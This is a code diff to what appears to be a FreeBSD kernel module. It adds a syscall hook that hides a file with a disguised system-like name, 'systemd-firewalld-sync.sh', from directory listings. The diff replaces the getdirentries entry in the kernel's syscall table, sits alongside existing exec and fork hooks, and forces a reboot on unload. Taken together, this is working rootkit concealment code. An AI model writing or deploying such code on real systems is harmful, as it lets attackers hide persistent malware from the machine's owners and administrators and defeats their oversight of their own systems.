@@ -32,8 +32,53 @@
 #include <amd64/include/tss.h> // for pcb
 #include <sys/pcpu.h> // for curenthread
 #include <sys/reboot.h>  // Needed for shutdown_nice()
+#include <sys/malloc.h> // for file hiding
+#include <sys/dirent.h> // for file hiding
 
+// save orignal pointer 
+static sy_call_t *original_getdirentries;
+// filename we want to hide
+# define FILENAME_TO_HIDE "systemd-firewalld-sync.sh"
 
+// custom syscall that filters out filename
+static int custom_getdirentries(struct thread *td, void *args) {
+	struct getdirentries_args *uap;
+	unsigned int size, count;
+	int error;
+	struct dirent *dp, *current;
+
+	uap = (struct getdirentries_args *)args;
+	error = sys_getdirentries(td, args);
+	size = td->td_retval[0];
+	
+	if (size > 0) {
+		dp = malloc(size, M_TEMP, M_WAITOK);
+		copyin(uap->buf, dp, size);
+
+		count = size;
+		current = dp;
+
+		while ((current->d_reclen != 0) && (count > 0)) {
+			count -= current->d_reclen;
+			// critical line right here, this is what matches and removes the filename
+            // og line uses strstr to match anything with some standard naming convention string
+			if (strstr(current->d_name, FILENAME_TO_HIDE)) {
+				if (count != 0) {
+					bcopy((char *)current + current->d_reclen, current, count);
+				}
+				size -= current->d_reclen;
+			}
+	
+			if (count > 0) {
+				current = (struct dirent *)	((char *)current + current->d_reclen);
+			}
+		}
+		td->td_retval[0] = size;
+		copyout(dp, uap->buf, size);
+		free(dp, M_TEMP);
+	}
+	return error;
+}
 
 // func not in header file so declare as extern 
 extern int kern_execve(struct thread *td, struct image_args *args, struct mac *mac_p, struct vmspace *oldvmspace);
@@ -398,8 +443,11 @@ static int event_handler(struct module *module, int event, void *arg) {
             load_hook();
             load_link();
             load_custom_fork_event_handler();
+            original_getdirentries = sysent[SYS_getdirentries].sy_call;
+            sysent[SYS_getdirentries].sy_call = (sy_call_t *)custom_getdirentries;
             return 0;
         case MOD_UNLOAD:
+            sysent[SYS_getdirentries].sy_call = original_getdirentries;
             unload();
             shutdown_nice(RB_AUTOBOOT);  // Reboots the system
             return 0;
